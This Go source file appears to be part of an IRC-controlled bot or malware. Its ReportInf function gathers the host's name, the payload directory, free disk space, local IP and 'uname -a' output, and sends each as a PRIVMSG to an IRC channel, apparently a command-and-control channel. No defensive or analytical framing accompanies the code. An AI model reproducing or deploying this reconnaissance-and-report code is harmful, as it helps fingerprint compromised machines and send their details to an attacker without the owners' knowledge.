package tools

import (
	"fmt"
	"net"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

func FreeDiskSpace(hw string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(hw, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024 //B to GB Formula
}

func GetLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:22")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	ip := conn.LocalAddr().String()
	return ip, nil
}

func SYSinfo() string {
	cmd, _ := exec.Command("uname", "-a").Output()
	return string(cmd)
}

func ReportInf(reportIRC net.Conn, set_chan string) {
	hName, _ := os.Hostname()
	pDir, _ := os.Getwd()

	hw := &pDir
	sFds := fmt.Sprint(FreeDiskSpace(*hw))
	sGlp := fmt.Sprint(GetLocalIP())

	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :System Info: "+SYSinfo())
	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Host Name: "+hName)
	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Payload DIR: "+pDir)
	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Free Disk Space (GB): "+sFds)
	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Local IP: "+sGlp)
}
